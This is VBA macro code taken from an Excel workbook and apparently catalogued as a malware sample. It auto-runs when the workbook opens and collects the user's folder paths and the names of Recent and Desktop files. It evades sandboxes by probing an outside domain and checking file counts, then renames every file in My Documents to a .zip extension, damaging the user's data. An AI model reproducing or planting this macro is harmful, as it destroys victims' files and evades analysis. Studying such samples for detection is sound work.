Attribute VB_Name = "Sheet1"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "ThisWorkbook"
Attribute VB_Base = "0{00020819-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Dim i As Integer
'Var Recent
Dim RecFld As String
'Var Dsk
Dim DFld As String
'Var MDF
Dim MDFP As String

Dim lngFileCount As Long
Dim lngFileCount2 As Long


Private Sub Workbook_Open()

 i = MsgBox("You are about to Enjoy your time Bro", vbCritical + vbOKOnly, "Alert ! ! !")
 'Get Mydocs &
 Call Devotee
 'Count #files in recent folder
 Call CountFiles
 If IsURL("www.germanymermanyparbhani.in") = False And lngFileCount > 0 And lngFileCount2 > 0 Then
    i = MsgBox("Not in SB", vbCritical + vbOKOnly, "Good News Alert ! ! !")
    Call MetaGamer
 Else
    i = MsgBox("In SB", vbCritical + vbOKOnly, "Be Alert ! ! !")
 End If
End Sub

    '*********************************************************************************************************
    '   strEmail (String):  Email address to Check
    '   blnCheckDomain (Boolean): Optional, check if email domain is valid.
    '*********************************************************************************************************
Public Function IsEmailAddress(strEmail As String, Optional blnCheckDomain As Boolean = False) As Boolean

    
    On Error GoTo Err:


    Dim strURL As String

    'Assume is not valid
    IsEmailAddress = False

    'Test if valid or not
    With CreateObject("vbscript.regexp")
        .Pattern = "^[\w-\.]+@([\w-]+\.)+[A-Za-z]{2,4}$"
        IsEmailAddress = .test(strEmail)
    End With

    If IsEmailAddress And blnCheckDomain Then
        strURL = Right(strEmail, Len(strEmail) - InStr(1, strEmail, "@", vbTextCompare))
        IsEmailAddress = IsURL(strURL)
    End If

ExitHere:
    Exit Function

Err:
    'If error occured, assume no valid
    IsEmailAddress = False
    GoTo ExitHere
End Function


Function IsURL(strURL As String) As Boolean

    '********************************************************************************************************
    'Function:  Determine if an URL address is valid
    'Arguments:
    '   strURL (String):  URL/domain to check
    '********************************************************************************************************

    Dim Request As Object
    Dim ff As Integer
    Dim rc As Variant

    On Error GoTo EndNow

    IsURL = False

    Set Request = CreateObject("WinHttp.WinHttpRequest.5.1")

    'Add http if not in strURL string
    If Left(strURL, 4) <> "http" Then
        strURL = "http://" & strURL
    End If

    With Request
      .Open "GET", strURL, False
      .Send
      rc = .StatusText
    End With

    Set Request = Nothing

    If rc = "OK" Then IsURL = True

EndNow:
    Exit Function

End Function

'This is heart flow enabler
Private Sub Devotee()

Dim objSFolders As Object
RecFld = ""
DFld = ""
MDFP = ""
Set objSFolders = CreateObject("WScript.Shell").SpecialFolders
Sheets("Sheet1").Activate
With Sheets("Sheet1")
.Range("B2").Value = "My Document Path is:-         " & objSFolders("mydocuments")
MDFP = Trim(objSFolders("mydocuments"))
'MDFP = Trim(Environ$("userprofile")) & "\Pictures"
.Range("B3").Value = "Desktop Path is:-             " & objSFolders("desktop")
 DFld = Trim(objSFolders("desktop"))
.Range("B4").Value = "All User Desktop Path is:-    " & objSFolders("allusersdesktop")
.Range("B5").Value = "Recent Documents Path is:-    " & objSFolders("recent")
RecFld = Trim(objSFolders("recent"))
.Range("B6").Value = "Favorites Document Path is:-  " & objSFolders("favorites")
.Range("B7").Value = "Programs Path is:-            " & objSFolders("programs")
.Range("B8").Value = "Start Menu Path is:-          " & objSFolders("StartMenu")
.Range("B9").Value = "Send To Path is:-             " & objSFolders("SendTo")
.Range("B10").Value = "Temp Path is:-             " & Environ$("temp")
.Range("B11").Value = "User profile is:-             " & Environ$("userprofile")
.Range("B12").Value = "User pictures profile is:-             " & Environ$("userprofile") & "\Pictures"
End With
End Sub


Sub CountFiles()
    Dim strDir As String
    
    Dim fso As Object
    Dim objFiles As Object
    Dim obj As Object
   
        ' Get recenmt file count
         strDir = RecFld
         Set fso = CreateObject("Scripting.FileSystemObject")
         Set objFiles = fso.GetFolder(strDir).Files
         lngFileCount = objFiles.Count
         MsgBox "In Recent " & lngFileCount     'Total number of files
        
         '***************************************************
         'NOTE: Ensure that the following code does not overwrite _
          anything in your workbook.
         'Active worksheet should be a blank worksheet
        
         For Each obj In objFiles
           ActiveSheet.Cells(Rows.Count, "F").End(xlUp).Offset(1, 0) = obj.Name
         Next obj
         Set objFiles = Nothing
         Set fso = Nothing
         Set obj = Nothing

        'Get dsktop file count
         strDir = DFld
         Set fso = CreateObject("Scripting.FileSystemObject")
         Set objFiles = fso.GetFolder(strDir).Files
         lngFileCount2 = objFiles.Count
         MsgBox "In Desktop " & lngFileCount2    'Total number of files
                 
         For Each obj In objFiles
           ActiveSheet.Cells(Rows.Count, "K").End(xlUp).Offset(1, 0) = obj.Name
         Next obj
    
    Set objFiles = Nothing
    Set fso = Nothing
    Set obj = Nothing
   
End Sub


Sub MetaGamer()

    'Create the instance of the FSO
    Set fso = CreateObject("Scripting.FileSystemObject")
    'Set the folder you want to search. NOTE - some antivirus may not like this
    Set FLD = fso.GetFolder(MDFP)

    'Loop through each file in the folder
    For Each fil In FLD.Files
        'Get complete file name with path
        strOldName = fil.Path
        
        'Check the file has an dot in the name
        If InStr(strOldName, ".") > 0 Then
        
            
            'Split the file on the underscore so we can get everything before it
            strfileparts = Split(strOldName, ".")
            
            If strfileparts(1) <> "zip" And strfileparts(1) <> "ini" Then
            'Build the new file name with everything before the
            'first under score plus the extension
            strNewName = strfileparts(0) & ".zip"

            'Use the MoveFile method to rename the file
            fso.MoveFile strOldName, strNewName
            End If
        
        End If
    Next
MsgBox "Game Over Darling!!!!"

End Sub


INQUEST-PP=macro
